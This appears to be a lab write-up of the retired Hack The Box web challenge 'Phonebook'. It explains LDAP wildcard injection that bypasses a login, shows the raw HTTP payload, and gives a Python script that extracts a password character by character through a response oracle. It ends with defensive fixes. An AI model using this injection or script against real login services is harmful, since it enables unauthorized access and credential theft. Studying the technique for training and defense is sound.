---
title: "Hack The Box Challenge — Phonebook"
summary: "Phonebook exposes an LDAP wildcard injection that bypasses authentication and creates a response oracle for recovering a password one character at a time."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Easy"
solvedAt: 2026-09-08
publishedAt: 2026-09-08
tags:
  - web-security
  - ldap-injection
  - authentication-bypass
  - blind-injection
  - response-oracle
  - automation
tools:
  - Burp Suite
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Phonebook"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge Phonebook. Its retired status was reconfirmed in the HTB Challenges archive on 8 September 2026. The flag, session cookie, temporary target address and unrelated personal information have been removed. No original challenge package is redistributed.

The rest of my published Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

Phonebook presents a small login form backed by a directory service. The page hints that workstation credentials can now be reused and names `Reese`, which makes LDAP a strong initial hypothesis. An ordinary login attempt produced the expected failure message, but replacing Reese's password with the LDAP wildcard `*` changed the server response to a redirect to `/` and issued an authenticated session cookie.

That single request demonstrated two related weaknesses. First, `Reese` with `*` bypassed authentication because the application treated the wildcard as part of an LDAP search filter rather than as a literal password. Second, values such as `H*`, followed by progressively longer prefixes, could turn the login response into a boolean oracle: a successful redirect meant that the tested prefix matched Reese's password. The flag itself is intentionally omitted.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `Phonebook` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Easy |
| Status | Retired, reconfirmed 8 September 2026 |
| Released | 30 October 2020 |
| Scenario | "Who is lucky enough to be included in the phonebook?" |

The [Hack The Box Phonebook page](https://app.hackthebox.com/challenges/Phonebook) identified the category, difficulty, release date and successful completion. Before publication, I also located Phonebook by name while the official HTB challenge list was filtered to **Retired**.

## Provided material and evidence boundaries

The challenge supplied an ephemeral HTTP service with a login form rather than a downloadable package. The preserved solve evidence consists of:

- The login page and its `Authentication failed` baseline.
- The hint about workstation credentials and the visible name `Reese`.
- A Burp Suite capture of the successful wildcard request.
- The `302 Found`, `Location: /` response and a redacted session cookie.
- An authenticated request to `/search` after the bypass.
- The HTB completion banner for Phonebook.

The temporary host and port are not useful after the container expires, so they are represented as `<TARGET>` below. An official PDF was supplied after the solve and used only to check the vulnerability class and intended password-recovery concept. Its Nikto, Gobuster and alternate-payload experiments were not part of my recorded workflow and are therefore not presented as if I performed them.

## Initial analysis

The application offered only two obvious inputs: a username and a password. The most useful clue was below the form:

```text
New (9.8.2020): You can now login using the workstation username and password! - Reese
```

In corporate environments, the same identity source is often shared between workstation logins and internal applications. That does not prove LDAP by itself, but it makes directory-backed authentication a reasonable hypothesis. The word `Phonebook` reinforces the idea because LDAP directories commonly store both authentication identities and contact information.

An initial login attempt returned:

```text
Authentication failed
```

This established a clean failure condition before modifying the request. I then proxied the form through Burp Suite so that the raw POST body and redirect behavior could be compared directly.

## Identifying the LDAP wildcard weakness

The decisive request was:

```http
POST /login HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

username=Reese&password=*
```

The response changed to:

```http
HTTP/1.1 302 Found
Location: /
Set-Cookie: mysession=<REDACTED>; Path=/; Max-Age=<REDACTED>
Content-Length: 0
```

The redirect to `/` and the new session cookie were the important evidence. This was not merely a different error message: the browser reached the authenticated phonebook, and Burp recorded a subsequent request to `/search`.

A simplified LDAP filter consistent with this behavior is:

```text
(&(username=Reese)(password=*))
```

The exact server-side attribute names were not available in the preserved evidence, so this filter is an explanatory reconstruction rather than recovered source code. Its semantics match the observation: in an LDAP search filter, `*` is a substring wildcard. The password clause therefore asks for any value instead of comparing against a literal asterisk.

## Chronological solution

### 1. Establishing the response oracle

The ordinary failure and wildcard success produced two stable outcomes:

| Candidate | Observable result | Meaning |
| --- | --- | --- |
| Incorrect password or prefix | Redirect back to `/login?...Authentication failed` | No matching directory entry |
| Matching password prefix followed by `*` | `302 Found` with `Location: /` | A directory entry matched |

This difference is a boolean oracle. The application never needs to print the stored password; it answers one yes-or-no question for each request.

### 2. Converting bypass into blind extraction

A single wildcard logs in but does not reveal which password matched. Prefix testing recovers that value incrementally:

```text
a*   -> failure
b*   -> failure
...
H*   -> success
```

After identifying the first character, the same process continues with two-character candidates:

```text
Ha*  -> failure
Hb*  -> failure
...
HT*  -> success
```

Each successful prefix becomes the starting point for the next round. This is blind LDAP injection: data is inferred from an application-side behavioral difference instead of being returned directly.

### 3. Keeping the validation signal simple

Burp showed that the cleanest comparison was the `Location` header. Following redirects would add HTML, assets and other noise to every request. Sending the POST with redirects disabled leaves only the two relevant states:

```text
Location: /        -> success
Location: /login…  -> failure
```

The same principle applies to many blind attacks: prefer a small, stable signal such as a status code, header, content length or timing difference.

## Reconstructed extraction helper

The following compact Python helper reproduces the confirmed request and response-oracle logic. It contains no recovered password or flag. The exact automated extraction transcript was not preserved during the solve, so this helper is documented as a reconstruction rather than as a separately verified artifact.

```python
#!/usr/bin/env python3
import string
import sys

import requests


def prefix_matches(login_url: str, username: str, prefix: str) -> bool:
    response = requests.post(
        login_url,
        data={
            "username": username,
            "password": prefix + "*",
        },
        allow_redirects=False,
        timeout=10,
    )

    return (
        response.status_code == 302
        and response.headers.get("Location") == "/"
    )


def recover(login_url: str, username: str) -> str:
    alphabet = string.ascii_letters + string.digits + "_-{}[]"
    recovered = ""

    while not recovered.endswith("}"):
        for candidate in alphabet:
            if prefix_matches(login_url, username, recovered + candidate):
                recovered += candidate
                print(f"[+] matched {len(recovered)} characters")
                break
        else:
            raise RuntimeError(
                "No candidate matched; review the alphabet or response oracle"
            )

    return recovered


if __name__ == "__main__":
    if len(sys.argv) != 3:
        raise SystemExit(
            f"Usage: {sys.argv[0]} http://<HOST>:<PORT>/login <USERNAME>"
        )

    secret = recover(sys.argv[1], sys.argv[2])
    print(f"[+] recovered secret length: {len(secret)}")
    print("[+] value removed from the public write-up")
```

A sanitized invocation would be:

```bash
python3 phonebook_ldap.py http://<HOST>:<PORT>/login Reese
```

The helper deliberately reports progress by length rather than printing each partial secret. That keeps screenshots and logs safer while preserving enough feedback to diagnose a stalled extraction.

## Validation

The authentication bypass was directly validated in Burp Suite:

1. `username=Reese&password=*` returned `302 Found`.
2. `Location: /` differed from the failed-login redirect.
3. The response issued a `mysession` cookie.
4. The authenticated application made a successful request to `/search`.

The HTB challenge page later displayed **You have completed the Phonebook challenge**, providing final platform-side confirmation. The submitted flag and recovered password are not included here.

## Failed and unsupported paths

The initial ordinary login failed, which was useful because it established the negative side of the response oracle. Beyond that baseline, the preserved evidence does not support claiming that I ran directory brute forcing, alternate LDAP filter payloads, server-side source review or an automated extraction to completion.

The authenticated `/search` endpoint was visible after the bypass, but no preserved response demonstrated that attacking it was necessary. I therefore did not turn it into a fabricated second exploit path. The shortest evidenced route remained the login wildcard and the resulting prefix oracle.

## Why the technique works

LDAP search filters use metacharacters with special meaning. In particular, `*` represents a substring wildcard. If untrusted input is concatenated into a filter without context-appropriate escaping, attacker input changes the query's logic.

The application also appears to treat “the search returned at least one entry” as equivalent to “the submitted password is correct.” That is unsafe authentication design. A wildcard can satisfy the search, and the different redirects reveal whether a tested prefix exists.

The vulnerability therefore has two layers:

- **Injection:** the password value is interpreted as LDAP filter syntax.
- **Information oracle:** success and failure responses reveal whether an attacker-controlled condition matched.

Rate limiting alone would slow extraction but would not repair either root cause.

## Defensive perspective

| Weakness | Defensive action |
| --- | --- |
| Unescaped LDAP filter input | Escape every variable using the correct LDAP search-filter encoding routine |
| Password comparison inside a search filter | Locate the user safely, then authenticate with a directory bind rather than searching for a password attribute |
| Overly broad accepted characters | Apply server-side allow-list validation where the identity format permits it |
| Distinct success and failure oracle | Keep authentication behavior and timing as uniform as practical |
| Unlimited prefix probes | Add rate limiting, lockout safeguards and monitoring for wildcard-heavy attempts |
| Excessive directory visibility | Use a least-privileged service account and restrict readable attributes |

Escaping must be context specific: LDAP distinguished names and LDAP search filters have different encoding rules. Removing only the asterisk is not a complete fix because other filter metacharacters can also alter query structure.

## Key takeaways

- A successful authentication bypass is not necessarily the end of an injection vulnerability; the same primitive can become a data-extraction oracle.
- Establish a known failure response before testing payloads so that subtle behavioral changes have meaning.
- Inspect raw redirects and cookies in Burp instead of relying only on what the rendered page displays.
- Treat backend syntax differently from SQL syntax. LDAP filters have their own operators, wildcards and escaping rules.
- Automate repetitive blind extraction only after manually confirming one reliable true/false condition.
- Separate executed evidence from reconstructed tooling so a write-up remains technically honest and reproducible.

## References

- [Hack The Box — Phonebook](https://app.hackthebox.com/challenges/Phonebook)
- [Hack The Box — Streaming, Writeups and Walkthrough Guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [OWASP LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Web Security Testing Guide — Testing for LDAP Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)
